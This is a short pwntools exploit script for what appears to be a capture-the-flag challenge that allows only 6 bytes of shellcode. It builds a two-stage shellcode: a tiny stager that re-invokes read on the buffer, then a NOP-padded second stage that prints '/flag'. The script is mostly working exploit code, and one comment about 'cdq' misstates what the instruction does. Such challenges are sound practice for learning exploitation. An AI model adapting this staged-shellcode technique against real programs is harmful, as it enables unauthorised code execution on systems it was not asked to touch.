from pwn import *

context.arch = 'amd64'

'''
this challenge only allow 6 bytes shellcode.

we notice that our payload read at $rdx (buffer address), and when call that shellcode (call rdx)
the rax is 0, and rsi is a bit number, so we can leverage this to trigger another read(rdi, rsi, rdx)
'''

sc = asm('''
cdq                             /* equal to xor rdi, rdi sometime when rax = 0, but only 1 byte*/ 
xchg esi, edx
syscall
''')

'''
when syscall get trigged, the stage2 payload also place at the same buffer (rdx), but the $pc is accumulated,
we need `nop` to overwrite the stage1 payload to make sure syscall return to stage2 payload.
-------------------------
--> stage1 buffer
-------------------------
-------------------------
--> syscall return
'''

sc2 = shellcraft.nop() * len(sc)
sc2 += shellcraft.cat('/flag')
sc2 = asm(sc2)

print(len(sc))
print(disasm(sc))
